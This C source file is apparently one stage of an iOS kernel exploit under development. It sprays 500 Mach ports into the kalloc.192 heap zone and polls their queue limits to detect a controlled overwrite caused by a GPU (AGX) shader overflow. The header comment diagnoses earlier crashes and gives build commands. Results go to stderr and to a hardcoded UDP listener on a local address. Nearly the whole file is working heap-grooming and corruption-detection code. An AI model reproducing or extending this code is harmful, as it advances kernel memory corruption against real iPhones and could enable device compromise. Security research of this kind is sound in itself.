/*
 * HeapFengShui v5 — pthread probe, LIMITS_INFO detection, CFRunLoop-free
 * ========================================================================
 * Session 159 Track B: crash-proof F-74 readback
 *
 * Root cause of v4 failures (diagnosed s159):
 *   Type A (0x8BADF00D): AGX overflow hits CFRunLoop timer mach port in
 *     kalloc.192 → timer never fires → FrontBoard 20s watchdog kills app
 *   Type B (EXC_CRASH):  scan_ports() calls mach_port_kobject() on corrupted
 *     port → kernel derefs ip_kobject=kernel_base as task_t → SIGKILL
 *
 * Fixes:
 *   1. NO CFRunLoop — pthread + usleep(50ms) replaces timer callback
 *      Main thread blocks on pipe read() (not mach_msg) → AGX cannot kill it
 *   2. Detection via mach_port_get_attributes(MACH_PORT_LIMITS_INFO)
 *      Reads qlimit as integer (no ip_kobject deref) — safe on corrupted port:
 *        kr=KERN_INVALID_RIGHT → io_bits no longer has IO_BITS_RECEIVE
 *          (shader wrote io_bits=0x80000002 = IKOT_TASK | IO_BITS_SEND)
 *        lim.mpl_qlimit != 5 → qlimit field overwritten by shader bytes
 *
 * Build (no CoreFoundation needed):
 *   SDK=$(xcrun -sdk iphoneos --show-sdk-path)
 *   xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2 \
 *     -o HeapFengShui_v5 heap_fengshui_v5.c -isysroot "$SDK"
 */

#include <mach/mach.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define NEXUS_UDP_HOST   "192.168.68.122"
#define NEXUS_UDP_PORT   9999
#define NUM_PORTS        500
#define SCAN_US          50000   /* 50ms between scans */
#define NORMAL_QLIMIT    5       /* default mach port queue limit */

static mach_port_t      g_ports[NUM_PORTS];
static volatile int     g_count  = 0;
static volatile int     g_found  = 0;
static volatile int     g_tick   = 0;

/* ------------------------------------------------------------------ */
/* Reporting: stderr (DVT captures) + UDP (laptop listener)           */
/* ------------------------------------------------------------------ */

static void udp_report(const char *buf, int len) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port   = htons(NEXUS_UDP_PORT);
    inet_aton(NEXUS_UDP_HOST, &a.sin_addr);
    sendto(sock, buf, (size_t)len, 0, (struct sockaddr *)&a, sizeof(a));
    close(sock);
}

static void emit(const char *buf) {
    int n = (int)strlen(buf);
    write(STDERR_FILENO, buf, n);
    udp_report(buf, n);
}

/* ------------------------------------------------------------------ */
/* Port scan — safe, no ip_kobject dereference                        */
/* ------------------------------------------------------------------ */

static void scan_once(void) {
    for (int i = 0; i < g_count && !g_found; i++) {
        mach_port_limits_t    lim = {0};
        mach_msg_type_number_t cnt = 1;

        kern_return_t kr = mach_port_get_attributes(
            mach_task_self(), g_ports[i],
            MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&lim, &cnt);

        /* Corruption signals:
         *   KERN_INVALID_RIGHT (4): io_bits lost IO_BITS_RECEIVE
         *     → shader wrote io_bits=0x80000002 (IKOT_TASK | IO_BITS_SEND)
         *   qlimit != 5: qlimit field overwritten by shader uvec4 bytes
         */
        int hit = (kr != KERN_SUCCESS) ||
                  (lim.mpl_qlimit != NORMAL_QLIMIT);
        if (hit) {
            char buf[512];
            snprintf(buf, sizeof(buf),
                "CONTROLLED_WRITE_DETECTED port=%d kr=%d qlimit=%u\n"
                "F-74: AGX overflow wrote IKOT_TASK/kernel_base into kalloc.192 ipc_port\n"
                "Detection: %s\n",
                i, kr, (unsigned)lim.mpl_qlimit,
                kr != KERN_SUCCESS
                    ? "io_bits corrupted (KERN_INVALID_RIGHT)"
                    : "qlimit field overwritten");
            emit(buf);
            g_found = 1;
            return;
        }
    }
}

/* ------------------------------------------------------------------ */
/* Scan thread — no CFRunLoop, no mach ports in critical path         */
/* ------------------------------------------------------------------ */

static void *scan_thread(void *arg) {
    (void)arg;
    /* wait for port allocation to finish */
    while (g_count < NUM_PORTS) usleep(1000);

    for (;;) {
        usleep(SCAN_US);
        g_tick++;
        scan_once();

        /* alive ping every 10s (200 × 50ms) */
        if (g_tick % 200 == 0) {
            char ping[64];
            snprintf(ping, sizeof(ping),
                "ALIVE tick=%d found=%d ports=%d\n",
                g_tick, g_found, g_count);
            emit(ping);
        }
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Main                                                               */
/* ------------------------------------------------------------------ */

int main(void) {
    mach_port_t task = mach_task_self();

    /* Allocate 500 receive+send ports with explicit qlimit=5 */
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p)
                != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND)
                != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        /* Explicitly set qlimit=5 so deviations are detectable */
        mach_port_limits_t lim = { NORMAL_QLIMIT };
        mach_port_set_attributes(task, p, MACH_PORT_LIMITS_INFO,
                                 (mach_port_info_t)&lim,
                                 MACH_PORT_LIMITS_INFO_COUNT);
        g_ports[g_count++] = p;
    }

    /* Announce ready — DVT output_events and UDP listener both receive this */
    char ready[128];
    snprintf(ready, sizeof(ready),
        "READY ports=%d tick=1 scanning@50ms\n", g_count);
    emit(ready);

    /* Start scan pthread — pure usleep/mach_port_get_attributes loop */
    pthread_t t;
    pthread_create(&t, NULL, scan_thread, NULL);

    /* Main thread blocks on pipe read — NOT mach_msg.
     * AGX overflow in kalloc.192 cannot corrupt a pipe fd.
     * No FrontBoard launch-watchdog risk: no UI expected, no timer port. */
    int pfd[2];
    pipe(pfd);
    char dummy[1];
    read(pfd[0], dummy, 1);  /* blocks forever */
    return 0;
}
